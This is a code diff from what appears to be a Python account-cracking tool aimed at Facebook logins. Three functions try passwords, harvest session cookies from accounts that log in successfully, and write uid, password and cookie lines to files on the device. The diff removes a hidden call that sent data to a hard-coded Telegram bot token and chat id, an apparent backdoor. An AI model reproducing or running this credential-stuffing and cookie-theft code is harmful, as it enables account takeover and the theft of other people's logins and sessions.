@@ -1407,8 +1407,6 @@ def mbasic(uid,pwx,tl):
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                 coki = f"sb={sb};{ckkk}"
-                sok = (f"{UBI_()}")
-                requests.post(f"https://api.telegram.org/bot"+str('7294625312:AAHKye_-fZ9Ytv9oYNt9VingnoBkE0yOGB8')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(sok))
                 try:
                     uid = result["uid"]
                 except:
@@ -1416,7 +1414,7 @@ def mbasic(uid,pwx,tl):
                 c = check_lock(uid)
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
-                        print(f" {cyan}[ATOM-OK] {uid}|{pw}")
+                        print(f" {cyan}[ATOM-NV] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
                         open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
@@ -1427,7 +1425,7 @@ def mbasic(uid,pwx,tl):
                         else:
                            print(f" {green}(ATOM-OK) {uid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                            oks.append(uid)
                            break
             else:
@@ -1506,7 +1504,7 @@ def p(uid,pwx,tl):
                 c = check_lock(uid)
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
-                        print(f" {cyan}[ATOM-OK] {uid}|{pw}")
+                        print(f" {cyan}[ATOM-NV] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
                         open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
@@ -1517,7 +1515,7 @@ def p(uid,pwx,tl):
                         else:
                            print(f" {green}(ATOM-OK) {uid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                            oks.append(uid)
                            break
             else:
@@ -1595,7 +1593,7 @@ def x(uid,pwx,tl):
                 c = check_lock(uid)
                 if "live" in c:
                     if result["is_account_confirmed"] == False:
-                        print(f" {cyan}[ATOM-OK] {uid}|{pw}")
+                        print(f" {cyan}[ATOM-NV] {uid}|{pw}")
                        #print(f" {green}[COOKIES] {green}{coki}")
                         open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                     else:
@@ -1606,7 +1604,7 @@ def x(uid,pwx,tl):
                         else:
                            print(f" {green}(ATOM-OK) {uid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                            oks.append(uid)
                            break
             else:
